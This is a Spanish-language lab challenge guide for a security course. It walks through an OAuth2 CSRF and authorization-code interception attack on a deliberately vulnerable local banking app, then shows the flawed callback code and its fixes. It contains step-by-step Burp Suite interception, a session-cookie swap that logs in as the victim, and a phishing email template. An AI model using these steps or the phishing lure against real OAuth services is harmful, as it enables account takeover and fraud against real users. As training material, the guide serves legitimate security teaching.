# 🎯 Desafío OAuth2 CSRF - Ataque por Interceptación de Callback

## 📋 Objetivo del Desafío

Explotar la vulnerabilidad **OAuth2 CSRF** para vincular la cuenta de Google de la víctima (María) a tu cuenta bancaria, obteniendo acceso a su información.

---

## 🔐 Credenciales Necesarias

### Atacante (Tu sesión)
- **Email:** `test@google.com`
- **Password:** `test123`

### Víctima (María)
- **Email:** `usuario@google.com`  
- **Password:** `google123`

---

## 🎯 Estrategia de Ataque: Interceptación Directa

Este método es **más efectivo** que enviar un link malicioso. En lugar de esperar a que la víctima haga clic, interceptamos su callback OAuth y **robamos su código de autorización** para usarlo en nuestra sesión.

### 🔍 Vulnerabilidad Explotada

**CWE-352: Cross-Site Request Forgery (CSRF)**
- El parámetro `state` no se valida correctamente
- El código de autorización puede ser interceptado y reusado
- No hay verificación de que el callback pertenezca a la sesión original

---

## 📊 Flujo del Ataque

```
┌─────────────┐                    ┌──────────────┐                   ┌─────────────┐
│  Atacante   │                    │  Fake Google │                   │   Víctima   │
│   (test)    │                    │    OAuth     │                   │   (María)   │
└──────┬──────┘                    └──────┬───────┘                   └──────┬──────┘
       │                                   │                                  │
       │ 1. Iniciar OAuth (capturar state) │                                  │
       │──────────────────────────────────>│                                  │
       │                                   │                                  │
       │ 2. state=ATTACKER_STATE           │                                  │
       │<──────────────────────────────────│                                  │
       │                                   │                                  │
       │                        3. Enviar link malicioso con state            │
       │────────────────────────────────────────────────────────────────────>│
       │                                   │                                  │
       │                                   │  4. Victim accede con su Google  │
       │                                   │<─────────────────────────────────│
       │                                   │                                  │
       │                                   │  5. Autoriza aplicación          │
       │                                   │<─────────────────────────────────│
       │                                   │                                  │
       │    6. INTERCEPTAR: /oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE
       │                                   │                                  │
       │ 7. MODIFICAR Cookie: session=ATTACKER_SESSION                        │
       │<──────────────────────────────────┘                                  │
       │                                                                      │
       │ 8. ¡Login exitoso como María usando su código OAuth!                │
       │                                                                      │
```

---

## 🚀 FASE 1: Preparación del Atacante

### Paso 1.1: Configurar Burp Suite

1. **Abrir Burp Suite Community Edition**
2. **Configurar Proxy:**
   - Ir a `Proxy` → `Options`
   - Verificar que esté escuchando en `127.0.0.1:8080`
   - Activar `Intercept is on`

3. **Configurar navegador:**
   ```
   Proxy manual:
   - HTTP Proxy: 127.0.0.1
   - Puerto: 8080
   ```

### Paso 1.2: Iniciar Sesión como Atacante

1. Acceder a: `http://127.0.0.1:5000`
2. Click en "Iniciar sesión con Google"
3. **EN BURP SUITE:** Interceptar la petición a `/oauth/init`

```http
GET /oauth/init HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0
Cookie: session=.eJw...ATACANTE...
```

4. **IMPORTANTE:** Copiar tu cookie de sesión completa:
   ```
   session=.eJw9kM1qAzEMhF9F...TU_SESSION_ATACANTE...
   ```

5. **Forward** la petición

### Paso 1.3: Capturar el State del Atacante

1. **EN BURP SUITE:** Interceptar el redirect a `/oauth/google/authorize`

```http
GET /oauth/google/authorize?response_type=code&client_id=banco_app_123&redirect_uri=http://127.0.0.1:5000/oauth/callback&state=c4f8a2e1d9b7... HTTP/1.1
Host: 127.0.0.1:5000
```

2. **COPIAR EL STATE:**
   ```
   state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0
   ```
   ⚠️ **Este es TU state, lo necesitarás después**

3. **Forward** todas las peticiones hasta completar el login
4. Loguearte con `test@google.com` / `test123`
5. Desactivar interceptación: `Intercept is off`
6. **Cerrar sesión** en el banco

---

## 🎯 FASE 2: Preparación de la Víctima

### Paso 2.1: Construir URL Maliciosa

Usar el **state del atacante** capturado en Fase 1:

```
http://127.0.0.1:5000/oauth/google/authorize?response_type=code&client_id=banco_app_123&redirect_uri=http://127.0.0.1:5000/oauth/callback&state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0
```

### Paso 2.2: Enviar a la Víctima

**Método realista:** Email/mensaje de phishing
```
Subject: 🎁 Banco Seguro - Bonificación exclusiva

¡Hola María!

Has sido seleccionada para recibir $5000 de bonificación.
Ingresa con tu cuenta de Google para reclamar tu premio:

http://127.0.0.1:5000/oauth/google/authorize?response_type=code&client_id=banco_app_123&redirect_uri=http://127.0.0.1:5000/oauth/callback&state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0

¡No dejes pasar esta oportunidad!
```

**Método de prueba:** Abrir en navegador privado/incógnito

---

## 💥 FASE 3: Ejecución del Ataque

### Paso 3.1: Activar Interceptación en Burp

1. **Burp Suite** → `Proxy` → `Intercept is on`
2. **HTTP history** abierto para revisar peticiones

### Paso 3.2: Víctima Accede al Link

**En navegador incógnito/privado:**

1. Pegar la URL maliciosa
2. Login con credenciales de María:
   - Email: `usuario@google.com`
   - Password: `google123`

### Paso 3.3: ⚡ INTERCEPTAR EL CALLBACK

Cuando María hace clic en "Authorize", **Burp interceptará** esta petición:

```http
GET /oauth/callback?code=d8f7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7&state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0 HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0
Cookie: session=.eJw...MARIA_SESSION...
Referer: http://127.0.0.1:5000/oauth/google/authorize
```

### Paso 3.4: 🔥 MODIFICAR LA PETICIÓN

**CLAVE DEL ATAQUE:** Cambiar la cookie de María por la tuya

**ANTES (sesión de María):**
```http
GET /oauth/callback?code=d8f7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7&state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=.eJw...MARIA_SESSION...
```

**DESPUÉS (tu sesión de atacante):**
```http
GET /oauth/callback?code=d8f7e9a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7&state=c4f8a2e1d9b7f6e3a5b2c8d1e4f7a9b0 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=.eJw9kM1qAzEMhF9F...TU_SESSION_ATACANTE...
```

### Paso 3.5: Forward y Verificar

1. **Click en "Forward"** en Burp Suite
2. Desactivar interceptación: `Intercept is off`
3. **En tu navegador principal** (no el incógnito), refrescar la página
4. **¡Deberías estar logueado como María!** 🎉

---

## ✅ Verificación del Ataque Exitoso

### Indicadores de Éxito

1. **Dashboard muestra:**
   ```
   Bienvenido: usuario@google.com (María)
   Cuenta: 9999-XXXX
   Saldo: $10,000.00
   ```

2. **En la consola del servidor verás:**
   ```
   OAuth callback - Code recibido
   Usuario autenticado: usuario@google.com
   Cuenta vinculada: oauth_105...
   ```

3. **Session cookies contienen:**
   ```python
   session['oauth_email'] = 'usuario@google.com'
   session['usuario_nombre'] = 'María López'
   session['auth_method'] = 'oauth_google'
   ```

---

## 🎓 Análisis Técnico de la Vulnerabilidad

### ¿Por qué funciona este ataque?

#### 1. **Falta de validación del State**

**Código vulnerable** (`app_banco.py` líneas 506-543):

```python
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state', '')
    
    # ⚠️ VULNERABILIDAD: No se valida el state
    # Debería verificar:
    # if state not in oauth_states:
    #     return "State inválido - CSRF detected"
    # if oauth_states[state]['session_id'] != session.get('_id'):
    #     return "State no pertenece a esta sesión"
    
    # Se procesa el código sin validar origen
    if code not in authorization_codes:
        flash('Código inválido', 'error')
        return redirect(url_for('login'))
    
    auth_data = authorization_codes[code]
    user_info = auth_data['user_info']
    
    # Se vincula la cuenta OAuth a quien tenga la sesión activa
    # (en este caso, el atacante)
```

#### 2. **Reutilización de códigos de autorización**

```python
# ⚠️ NO se elimina el código después de usarlo
# auth_data['used_count'] incrementa pero no se valida
auth_data['used_count'] = auth_data.get('used_count', 0) + 1

# DEBERÍA SER:
# if auth_data.get('used_count', 0) > 0:
#     return "Código ya utilizado"
# del authorization_codes[code]
```

#### 3. **Vinculación automática sin confirmación**

```python
# Se crea/vincula la cuenta sin pedir confirmación
oauth_username = f"oauth_{user_info['user_id']}"
cursor.execute('SELECT * FROM cuentas WHERE usuario = ?', (oauth_username,))

if not cuenta:
    # Crea cuenta automáticamente con info de Google
    cursor.execute('''
        INSERT INTO cuentas (nombre, numero_cuenta, saldo, tipo_cuenta, usuario, password)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_info['name'], numero_cuenta, 10000.00, ...))
```

---

## 🛡️ Mitigaciones Recomendadas

### 1. **Validar State Correctamente**

```python
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state', '')
    
    # ✅ VALIDAR STATE
    if not state or state not in oauth_states:
        flash('State inválido - posible ataque CSRF', 'error')
        return redirect(url_for('login'))
    
    # ✅ VERIFICAR QUE PERTENEZCA A LA SESIÓN ACTUAL
    state_data = oauth_states[state]
    if state_data['session_id'] != session.get('_id'):
        flash('State no pertenece a esta sesión', 'error')
        return redirect(url_for('login'))
    
    # ✅ ELIMINAR STATE USADO
    del oauth_states[state]
```

### 2. **Código de Autorización de Un Solo Uso**

```python
# ✅ VALIDAR QUE NO SE HAYA USADO
if code not in authorization_codes:
    return error("Código inválido o expirado")

auth_data = authorization_codes[code]

if auth_data.get('used', False):
    return error("Código ya utilizado - Code Replay Attack")

# ✅ MARCAR COMO USADO Y ELIMINAR
auth_data['used'] = True
del authorization_codes[code]
```

### 3. **Implementar PKCE (RFC 7636)**

```python
# Generar code_verifier y code_challenge
import hashlib
import base64

code_verifier = secrets.token_urlsafe(32)
code_challenge = base64.urlsafe_b64encode(
    hashlib.sha256(code_verifier.encode()).digest()
).decode().rstrip('=')

# Incluir en authorize request
params = {
    'response_type': 'code',
    'client_id': CLIENT_ID,
    'redirect_uri': REDIRECT_URI,
    'state': state,
    'code_challenge': code_challenge,
    'code_challenge_method': 'S256'
}
```

### 4. **Timeout Más Corto**

```python
# Reducir tiempo de validez del código
AUTHORIZATION_CODE_TIMEOUT = 30  # 30 segundos en lugar de 5 minutos

if time.time() - auth_data['timestamp'] > AUTHORIZATION_CODE_TIMEOUT:
    del authorization_codes[code]
    return error("Código expirado")
```

---

## 📸 Capturas Recomendadas para Documentación

### Screenshot 1: Interceptación del State
- **Ubicación:** Burp Suite → Proxy → Intercept
- **Mostrar:** GET /oauth/google/authorize con parámetro state
- **Highlight:** El valor del state en la URL

### Screenshot 2: Construcción URL Maliciosa
- **Ubicación:** Editor de texto con URL completa
- **Mostrar:** State del atacante en la URL
- **Highlight:** Parámetro state=...

### Screenshot 3: Login de Víctima
- **Ubicación:** Fake Google OAuth
- **Mostrar:** María logueándose con usuario@google.com
- **Highlight:** Botón "Authorize"

### Screenshot 4: Interceptación del Callback
- **Ubicación:** Burp Suite → Proxy → Intercept
- **Mostrar:** GET /oauth/callback con code y state
- **Highlight:** Cookie de María ANTES de modificar

### Screenshot 5: Modificación de Cookie
- **Ubicación:** Burp Suite → Request modificado
- **Mostrar:** Cookie cambiada a sesión del atacante
- **Highlight:** Cookie DESPUÉS de modificar

### Screenshot 6: Login Exitoso
- **Ubicación:** Dashboard bancario
- **Mostrar:** "Bienvenido usuario@google.com" en sesión del atacante
- **Highlight:** Email y saldo de María

### Screenshot 7: HTTP History Completo
- **Ubicación:** Burp Suite → Proxy → HTTP History
- **Mostrar:** Secuencia completa de peticiones
- **Highlight:** /oauth/init, /authorize, /callback

---

## 🎯 Checklist de Completación

```
✅ FASE 1: Preparación
  ☐ Burp Suite configurado y funcionando
  ☐ Sesión de atacante iniciada
  ☐ Cookie de atacante capturada y guardada
  ☐ State del atacante capturado

✅ FASE 2: Preparación Víctima
  ☐ URL maliciosa construida con state del atacante
  ☐ Navegador incógnito preparado
  ☐ Credenciales de María verificadas

✅ FASE 3: Ataque
  ☐ Interceptación activada en Burp
  ☐ Víctima accede a URL maliciosa
  ☐ Callback interceptado correctamente
  ☐ Cookie modificada de María → Atacante
  ☐ Forward enviado
  ☐ Login exitoso como María

✅ VERIFICACIÓN
  ☐ Dashboard muestra datos de María
  ☐ Email: usuario@google.com
  ☐ Cuenta OAuth vinculada
  ☐ Captura de pantalla tomada
```

---

## 🚨 Troubleshooting

### Problema: "Código de autorización inválido"

**Causa:** El código expira muy rápido o ya fue usado

**Solución:**
1. Asegurarse de hacer el ataque rápidamente (< 5 minutos)
2. No recargar la página del callback antes de interceptar
3. Verificar que el código no tenga espacios o caracteres extra

### Problema: "State inválido"

**Causa:** El state no fue capturado correctamente

**Solución:**
1. Volver a Fase 1 y capturar el state nuevamente
2. Copiar el state completo (sin espacios ni saltos de línea)
3. Verificar que la URL maliciosa tenga el state correcto

### Problema: Burp no intercepta el callback

**Causa:** Interceptación desactivada o filtros activos

**Solución:**
1. Verificar `Intercept is on`
2. Revisar `Proxy` → `Options` → `Intercept Client Requests`
3. Asegurarse que no haya filtros que excluyan localhost

### Problema: Cookie no se copia correctamente

**Causa:** Caracteres especiales o encoding incorrecto

**Solución:**
1. Copiar la cookie COMPLETA incluyendo `session=`
2. No incluir el encabezado `Cookie: `, solo el valor
3. Verificar que no haya saltos de línea en medio

---

## 📚 Referencias Adicionales

- **GUIA_PRACTICA_OAUTH.md**: Tutorial paso a paso con más detalles
- **README_OAUTH.md**: Guía rápida de inicio
- **OAUTH_VULNERABILITIES.md**: Análisis técnico de las 5 vulnerabilidades
- **INSTALACION.md**: Setup de Python, Burp Suite y dependencias

---

## 🏆 Objetivo Final

Al completar exitosamente este desafío:

1. ✅ Comprenderás cómo funciona OAuth2 CSRF
2. ✅ Sabrás interceptar y modificar peticiones HTTP
3. ✅ Identificarás vulnerabilidades en implementaciones OAuth
4. ✅ Podrás explicar las mitigaciones necesarias

**¡Código de verificación:** Cuando accedas al dashboard como María, copia el **código de autorización** usado y envíalo en:

```
http://127.0.0.1:5001/desafio/oauth
```

---

**Creado por:** TPI-SDS - Seguridad y Desarrollo de Software  
**Versión:** 2.0 - Ataque por Interceptación Directa  
**Última actualización:** Noviembre 2025
